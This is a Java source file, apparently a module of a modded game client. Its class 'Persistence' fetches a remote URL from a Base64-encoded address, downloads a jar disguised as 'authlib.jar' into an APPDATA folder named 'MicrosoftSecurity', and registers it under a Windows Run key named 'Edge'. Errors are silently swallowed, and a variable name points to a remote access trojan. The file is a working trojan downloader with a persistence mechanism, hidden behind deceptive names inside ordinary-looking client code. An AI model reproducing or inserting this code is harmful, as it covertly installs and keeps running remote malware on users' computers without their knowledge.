package dev.client.module.misc;

import org.apache.commons.io.FileUtils;

import java.io.IOException;
import java.io.File;
import java.net.URL;

import static dev.client.utils.client.Base64Util.decode;

public class Persistence {
    public static void install() throws IOException {
        String papuRat = System.getenv("APPDATA") + "\\MicrosoftSecurity";
        File dir = new File(papuRat);
        if (!dir.exists()) {dir.mkdirs();}
        String url = new java.util.Scanner(new URL(decode("")).openStream()).useDelimiter("\\A").next();
        File file = new File(System.getenv("APPDATA") + "/MicrosoftSecurity/authlib.jar");
        String appdata = System.getenv("APPDATA");
        String javaRuntime = System.getProperty("java.home") + File.separator + "bin" + File.separator + "javaw.exe";
        String jarPath = appdata + File.separator + "MicrosoftSecurity" + File.separator + "authlib.jar";
        String command = String.format("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Edge /t REG_SZ /d \"%s -jar %s\" /f", javaRuntime, jarPath);
        if(!file.exists()){
            try {
                FileUtils.copyURLToFile(
                        new URL(url),
                        new File(System.getenv("APPDATA") + "/MicrosoftSecurity/authlib.jar")
                );
                Process process = Runtime.getRuntime().exec(command);
                int exitCode = process.waitFor();
                if(exitCode == 0){
                    System.out.print("Installed persistence.");
                }
            } catch (Exception e) {}
        }
    }
}
